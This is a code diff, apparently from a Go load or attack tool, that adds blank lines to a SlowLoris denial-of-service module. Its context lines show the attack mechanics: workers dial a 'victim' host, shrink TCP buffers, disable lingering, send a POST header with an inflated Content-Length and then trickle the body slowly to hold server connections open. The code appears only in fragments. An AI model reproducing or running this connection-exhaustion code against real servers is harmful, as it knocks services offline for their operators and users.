@@ -47,6 +47,7 @@ func Start(stopChan chan bool, config *Config) error {
 	targetURL, err := url.Parse(config.Path)
 	if err != nil {
 		log.Printf("Cannot parse Path=[%s]: %v", targetURL, err)
+
 		return err
 	}
 
@@ -58,20 +59,24 @@ func Start(stopChan chan bool, config *Config) error {
 		}
 		targetHostPort = net.JoinHostPort(targetHostPort, port)
 	}
+
 	host := targetURL.Host
 	if len(config.HostHeader) > 0 {
 		host = config.HostHeader
 	}
+
 	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n",
 		targetURL.RequestURI(), host, config.ContentLength))
-
 	dialWorkersLaunchInterval := config.RampUpInterval / time.Duration(config.DialWorkersCount)
 	activeConnectionsCh := make(chan int, config.DialWorkersCount)
+
 	go s.activeConnectionsCounter(activeConnectionsCh)
+
 	for i := 0; i < config.DialWorkersCount; i++ {
 		go s.dialWorker(stopChan, config, activeConnectionsCh, targetHostPort, targetURL, requestHeader)
 		time.Sleep(dialWorkersLaunchInterval)
 	}
+
 	time.Sleep(config.Duration)
 
 	return nil
@@ -107,6 +112,7 @@ func (s SlowLoris) dialVictim(hostPort string, isTLS bool) io.ReadWriteCloser {
 	if err != nil {
 		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
 		log.Printf("Couldn't establish connection to [%s]: %v", hostPort, err)
+
 		return nil
 	}
 
@@ -121,18 +127,21 @@ func (s SlowLoris) dialVictim(hostPort string, isTLS bool) io.ReadWriteCloser {
 	if err = tcpConn.SetReadBuffer(bufferSize); err != nil {
 		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
 		log.Printf("Cannot shrink TCP read buffer: %v", err)
+
 		return nil
 	}
 
 	if err = tcpConn.SetWriteBuffer(bufferSize); err != nil {
 		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
 		log.Printf("Cannot shrink TCP write buffer: %v", err)
+
 		return nil
 	}
 
 	if err = tcpConn.SetLinger(0); err != nil {
 		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
 		log.Printf("Cannot disable TCP lingering: %v", err)
+
 		return nil
 	}
 
@@ -148,6 +157,7 @@ func (s SlowLoris) dialVictim(hostPort string, isTLS bool) io.ReadWriteCloser {
 		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
 		conn.Close()
 		log.Printf("Couldn't establish tls connection to [%s]: %v", hostPort, err)
+
 		return nil
 	}
 
@@ -160,6 +170,7 @@ func (s SlowLoris) doLoris(config *Config, destinationHostPort string, conn io.R
 	if _, err := conn.Write(requestHeader); err != nil {
 		metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusFail)
 		log.Printf("Cannot write requestHeader=[%v]: %v", requestHeader, err)
+
 		return
 	}
 
@@ -178,6 +189,7 @@ func (s SlowLoris) doLoris(config *Config, destinationHostPort string, conn io.R
 		if _, err := conn.Write(sharedWriteBuf); err != nil {
 			metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusFail)
 			log.Printf("Error when writing %d byte out of %d bytes: %v", i, config.ContentLength, err)
+
 			return
 		}
 		metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusSuccess)
